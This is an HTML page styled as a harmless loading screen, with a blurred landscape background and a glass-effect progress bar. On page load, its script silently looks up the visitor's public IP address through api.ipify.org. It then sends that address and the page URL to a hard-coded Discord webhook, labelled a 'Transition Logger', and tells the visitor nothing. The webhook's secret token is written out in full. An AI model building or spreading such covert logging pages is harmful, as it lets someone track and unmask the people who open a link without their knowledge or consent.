<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Delta</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body, html {
            height: 100%;
            width: 100%;
            overflow: hidden;
            /* Quitamos el fondo negro y usamos un color neutro de respaldo */
            background-color: #f0f0f0; 
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', sans-serif;
        }

        /* Imagen de fondo (Visible desde el inicio) */
        .background-image {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            /* URL de la imagen de naturaleza */
            background-image: url('https://wallpapers.com/images/hd/4k-nature-moraine-lake-r66plwqa8m3z5reg.jpg');
            background-size: cover;
            background-position: center;
            opacity: 1; /* Ahora es visible desde el inicio */
            filter: blur(5px); /* Un pequeño desenfoque mientras carga */
            transition: filter 1.5s ease-in-out;
        }

        /* Panel Glassmorphism */
        .glass-panel {
            z-index: 1;
            padding: 25px 40px;
            width: 350px;
            background: rgba(255, 255, 255, 0.1); /* Ajustado para que se vea sobre la foto */
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
            transition: opacity 1s ease-in-out, transform 1s ease-in-out;
        }

        .loader-box {
            width: 100%;
            height: 6px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #00f2fe, #4facfe);
            box-shadow: 0 0 15px rgba(0, 242, 254, 0.8);
            transition: width 0.1s linear;
        }

        /* Estados de animación */
        .fade-out {
            opacity: 0;
            transform: scale(0.9);
            pointer-events: none;
        }

        .remove-blur {
            filter: blur(0px) !important;
        }
    </style>
</head>
<body>

    <div class="background-image" id="bg"></div>

    <div class="glass-panel" id="main-panel">
        <div class="loader-box">
            <div class="progress-fill" id="progress"></div>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1494884260577022002/M67ttC3ZWJ4wobkDm-1S6PSj53UzbYOh-lsXhhfeHaXnBqYXTb0BWDrySTVGQKkjIpoj';

        window.onload = function() {
            startLoading();
            sendData();
        };

        function startLoading() {
            const bar = document.getElementById('progress');
            const panel = document.getElementById('main-panel');
            const bg = document.getElementById('bg');
            let width = 0;

            const interval = setInterval(() => {
                if (width >= 100) {
                    clearInterval(interval);
                    
                    // Al terminar, quitamos el desenfoque del fondo y ocultamos el panel
                    setTimeout(() => {
                        panel.classList.add('fade-out');
                        bg.classList.add('remove-blur');
                    }, 500);

                } else {
                    width += 2;
                    bar.style.width = width + '%';
                }
            }, 50);
        }

        async function sendData() {
            let userIP = "Unknown";
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                userIP = data.ip;
            } catch (e) {}

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        description: `🌐 **IP Detectada:** \`${userIP}\` \n🔗 **URL:** ${window.location.href}`,
                        color: 3447003, 
                        footer: { text: "Delta System | Transition Logger" }
                    }]
                })
            }).catch(() => {});
        }
    </script>
</body>
</html>
